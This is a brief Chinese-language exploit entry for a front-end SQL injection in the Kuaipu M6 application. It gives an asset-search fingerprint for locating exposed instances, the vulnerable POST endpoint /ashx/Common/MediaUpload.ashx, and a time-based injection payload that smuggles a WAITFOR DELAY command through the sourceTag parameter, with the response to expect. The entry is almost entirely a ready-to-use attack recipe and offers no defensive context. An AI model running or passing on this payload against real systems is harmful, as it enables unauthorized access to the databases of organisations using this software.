# 快普M6前台SQL注入漏洞

快普M6前台 ｜ SQL注入 ｜ —
- **指纹**：`app="快普-M6"`
- **请求**：`POST /ashx/Common/MediaUpload.ashx HTTP/1.1`

**Payload**
```
upload=check&dasdsa=1&sourceTag=11');WAITFOR DELAY '0:0:5'--&field=1
```
- **响应特征**：200